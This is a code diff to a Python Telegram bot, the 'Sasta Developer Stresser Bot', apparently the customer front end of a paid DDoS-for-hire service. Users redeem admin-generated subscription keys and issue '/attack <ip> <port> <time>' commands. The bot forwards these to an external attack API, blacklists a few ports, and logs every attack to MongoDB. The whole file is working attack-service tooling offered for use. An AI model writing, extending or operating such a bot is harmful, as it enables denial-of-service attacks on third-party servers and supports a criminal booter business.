@@ -1,10 +1,10 @@
 import asyncio
 import logging
+import secrets
 import re
 import os
 import uuid
 import requests
-import secrets
 from datetime import datetime, timedelta, timezone
 from typing import Dict, Optional, List
 from functools import wraps
@@ -31,12 +31,10 @@ load_dotenv()
 
 BOT_TOKEN = os.getenv("BOT_TOKEN")
 MONGODB_URI = os.getenv("MONGODB_URI")
-DATABASE_NAME = os.getenv("DATABASE_NAME", "sastadev")
+DATABASE_NAME = os.getenv("DATABASE_NAME", "sasta_bot")
 API_URL = os.getenv("API_URL")
 API_KEY = os.getenv("API_KEY")
-
-admin_raw = os.getenv("ADMIN_IDS", "")
-ADMIN_IDS = [int(id.strip()) for id in admin_raw.split(",") if id.strip().isdigit()]
+ADMIN_IDS = [int(id.strip()) for id in os.getenv("ADMIN_IDS", "").split(",") if id.strip().isdigit()]
 
 BLOCKED_PORTS = {8700, 20000, 443, 17500, 9031, 20002, 20001}
 
@@ -50,16 +48,17 @@ def make_aware(dt):
 def get_current_time():
     return datetime.now(timezone.utc)
 
+def get_blocked_ports_list() -> str:
+    return ", ".join(str(port) for port in sorted(BLOCKED_PORTS))
+
 # --- DATABASE CLASS ---
 class Database:
     def __init__(self):
-        if not MONGODB_URI:
-            raise ValueError("MONGODB_URI environment variable is missing.")
         self.client = MongoClient(MONGODB_URI)
         self.db = self.client[DATABASE_NAME]
         self.users = self.db.users
         self.attacks = self.db.attacks
-        self.keys = self.db.keys  # New collection for keys
+        self.keys = self.db.keys
         self._setup_db()
 
     def _setup_db(self):
@@ -67,15 +66,12 @@ class Database:
             self.users.delete_many({"user_id": {"$in": [None, ""]}})
             self.attacks.create_index([("timestamp", DESCENDING)])
             self.keys.create_index([("key", ASCENDING)], unique=True)
-            
-            # Safe index creation for user_id
             try:
                 self.users.create_index([("user_id", ASCENDING)], unique=True)
-            except pymongo.errors.OperationFailure:
+            except:
                 self.users.drop_index("user_id_1")
                 self.users.create_index([("user_id", ASCENDING)], unique=True)
-                
-            logger.info("✅ Database systems initialized.")
+            logger.info("✅ Database optimized.")
         except Exception as e:
             logger.error(f"❌ DB Setup Error: {e}")
 
@@ -88,51 +84,35 @@ class Database:
 
     def create_user(self, user_id: int, username: str = None):
         if self.get_user(user_id): return
-        user_data = {
-            "user_id": user_id,
-            "username": username,
-            "approved": False,
-            "total_attacks": 0,
-            "created_at": get_current_time(),
-        }
-        self.users.insert_one(user_data)
+        self.users.insert_one({
+            "user_id": user_id, "username": username, "approved": False,
+            "total_attacks": 0, "created_at": get_current_time(), "is_banned": False
+        })
 
     def generate_key(self, duration_days: int):
         key = f"SASTA-{secrets.token_hex(4).upper()}"
         self.keys.insert_one({
-            "key": key,
-            "duration": duration_days,
-            "used": False,
-            "used_by": None,
-            "created_at": get_current_time()
+            "key": key, "duration": duration_days, "used": False, "created_at": get_current_time()
         })
         return key
 
     def redeem_key(self, user_id: int, key_str: str):
         key_doc = self.keys.find_one({"key": key_str, "used": False})
-        if not key_doc:
-            return False, "Invalid or already used key."
+        if not key_doc: return False, "Invalid or already used key."
         
         duration = key_doc["duration"]
         expires_at = get_current_time() + timedelta(days=duration)
-        
         self.users.update_one(
             {"user_id": user_id},
-            {"$set": {
-                "approved": True, 
-                "approved_at": get_current_time(), 
-                "expires_at": expires_at
-            }}
+            {"$set": {"approved": True, "approved_at": get_current_time(), "expires_at": expires_at}}
         )
         self.keys.update_one({"key": key_str}, {"$set": {"used": True, "used_by": user_id}})
         return True, f"Success! Added {duration} days access."
 
-    def log_attack(self, user_id: int, ip: str, port: int, duration: int, status: str):
+    def log_attack(self, user_id, ip, port, duration, status):
         self.attacks.insert_one({
-            "_id": str(uuid.uuid4()),
-            "user_id": user_id,
-            "ip": ip, "port": port, "duration": duration,
-            "status": status, "timestamp": get_current_time()
+            "_id": str(uuid.uuid4()), "user_id": user_id, "ip": ip, "port": port,
+            "duration": duration, "status": status, "timestamp": get_current_time()
         })
         self.users.update_one({"user_id": user_id}, {"$inc": {"total_attacks": 1}})
 
@@ -143,22 +123,20 @@ def admin_required(func):
     @wraps(func)
     async def wrapper(update: Update, context: ContextTypes.DEFAULT_TYPE):
         if update.effective_user.id not in ADMIN_IDS:
-            await update.message.reply_text("❌ Admin access required.")
+            await update.message.reply_text("❌ Unauthorized.")
             return
         return await func(update, context)
     return wrapper
 
-# --- COMMAND HANDLERS ---
+# --- HANDLERS ---
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user_id = update.effective_user.id
-    db.create_user(user_id, update.effective_user.username)
+    db.create_user(update.effective_user.id, update.effective_user.username)
     await update.message.reply_text(
-        "🔥 **Welcome to Sasta Developer Bot**\n\n"
+        "🚀 **Sasta Developer Stresser Bot**\n\n"
         "Commands:\n"
         "🔹 `/attack <ip> <port> <time>`\n"
-        "🔹 `/redeem <key>` - Activate access\n"
-        "🔹 `/myinfo` - Check status\n\n"
-        "Admins: Use `/genkey <days>` to create access keys."
+        "🔹 `/redeem <key>`\n"
+        "🔹 `/myinfo` - View subscription status"
     )
 
 async def redeem(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -168,12 +146,16 @@ async def redeem(update: Update, context: ContextTypes.DEFAULT_TYPE):
     success, msg = db.redeem_key(update.effective_user.id, context.args[0].upper())
     await update.message.reply_text("✅ " + msg if success else "❌ " + msg)
 
+@admin_required
+async def genkey(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    days = int(context.args[0]) if context.args else 30
+    key = db.generate_key(days)
+    await update.message.reply_text(f"🔑 **New Key Created ({days} Days):**\n`{key}`")
+
 async def attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user_id = update.effective_user.id
-    user = db.get_user(user_id)
-    
+    user = db.get_user(update.effective_user.id)
     if not user or not user.get("approved") or user.get("expires_at") < get_current_time():
-        await update.message.reply_text("❌ No active subscription. Use /redeem to activate.")
+        await update.message.reply_text("❌ No active subscription. Use /redeem.")
         return
 
     if len(context.args) != 3:
@@ -185,53 +167,68 @@ async def attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text("❌ Port is blacklisted.")
         return
 
-    msg = await update.message.reply_text("🚀 **Launching Attack...**")
+    msg = await update.message.reply_text("🚀 **Launching...**")
     try:
-        res = requests.post(
-            f"{API_URL}/api/v1/attack", 
-            json={"ip": ip, "port": port, "duration": duration},
-            headers={"x-api-key": API_KEY}, timeout=15
-        ).json()
-        
+        res = requests.post(f"{API_URL}/api/v1/attack", 
+                           json={"ip": ip, "port": port, "duration": duration},
+                           headers={"x-api-key": API_KEY}, timeout=15).json()
         if res.get("success"):
-            db.log_attack(user_id, ip, port, duration, "success")
+            db.log_attack(user["user_id"], ip, port, duration, "success")
             await msg.edit_text(f"✅ **Attack Sent!**\nTarget: `{ip}:{port}`\nTime: `{duration}s`")
         else:
-            db.log_attack(user_id, ip, port, duration, "failed")
-            await msg.edit_text(f"❌ **API Error:** {res.get('error', 'Unknown')}")
+            await msg.edit_text(f"❌ Error: {res.get('error', 'Unknown')}")
     except Exception as e:
-        await msg.edit_text(f"❌ **Connection Error:** {str(e)}")
-
-@admin_required
-async def genkey(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    days = int(context.args[0]) if context.args else 30
-    key = db.generate_key(days)
-    await update.message.reply_text(f"🔑 **Generated Key ({days} Days):**\n`{key}`\n\nGive this to the user.")
+        await msg.edit_text(f"❌ Connection Error: {str(e)}")
 
 async def myinfo(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user = db.get_user(update.effective_user.id)
     if not user: return
-    status = "✅ Active" if user.get("approved") and user.get("expires_at") > get_current_time() else "❌ Expired/Inactive"
-    expiry = user.get("expires_at").strftime('%Y-%m-%d %H:%M') if user.get("expires_at") else "N/A"
+    
+    exp = user.get("expires_at")
+    is_active = user.get("approved") and (not exp or exp > get_current_time())
+    status = "✅ Active" if is_active else "❌ Expired/Inactive"
+    exp_str = exp.strftime('%Y-%m-%d %H:%M') if exp else "N/A"
     
     await update.message.reply_text(
-        f"👤 **Account Info**\n"
-        f"ID: `{user['user_id']}`\n"
+        f"👤 **Your Account**\n"
         f"Status: {status}\n"
-        f"Expiry: `{expiry}`\n"
+        f"Expiry: `{exp_str}`\n"
         f"Total Attacks: `{user.get('total_attacks', 0)}`"
     )
 
+# --- STARTUP LOGIC ---
 def main():
-    if not BOT_TOKEN: return
-    app = Application.builder().token(BOT_TOKEN).build()
-    app.add_handler(CommandHandler("start", start))
-    app.add_handler(CommandHandler("attack", attack))
-    app.add_handler(CommandHandler("redeem", redeem))
-    app.add_handler(CommandHandler("genkey", genkey))
-    app.add_handler(CommandHandler("myinfo", myinfo))
-    print("🚀 Bot Started!")
-    app.run_polling()
+    if not BOT_TOKEN:
+        print("❌ ERROR: BOT_TOKEN is missing!")
+        return
+
+    application = Application.builder().token(BOT_TOKEN).build()
+
+    # Register handlers
+    application.add_handler(CommandHandler("start", start))
+    application.add_handler(CommandHandler("attack", attack))
+    application.add_handler(CommandHandler("redeem", redeem))
+    application.add_handler(CommandHandler("genkey", genkey))
+    application.add_handler(CommandHandler("myinfo", myinfo))
+
+    # Get Public IP
+    try:
+        ip = requests.get('https://api.ipify.org', timeout=5).text
+    except:
+        ip = "Unknown/Local"
+
+    print("\n" + "="*40)
+    print("🤖 Bot is starting...")
+    print(f"Server IP: {ip}")
+    print(f"📊 MongoDB: Connected and indexes optimized.")
+    print(f"👑 Admin IDs: {ADMIN_IDS}")
+    print(f"🌐 API URL: {API_URL}")
+    print(f"🔑 API Key: {API_KEY[:10] if API_KEY else 'NONE'}...")
+    print(f"🚫 Blocked Ports: {get_blocked_ports_list()}")
+    print("✅ Bot is running!")
+    print("="*40 + "\n")
+
+    application.run_polling(allowed_updates=Update.ALL_TYPES)
 
 if __name__ == "__main__":
     main()
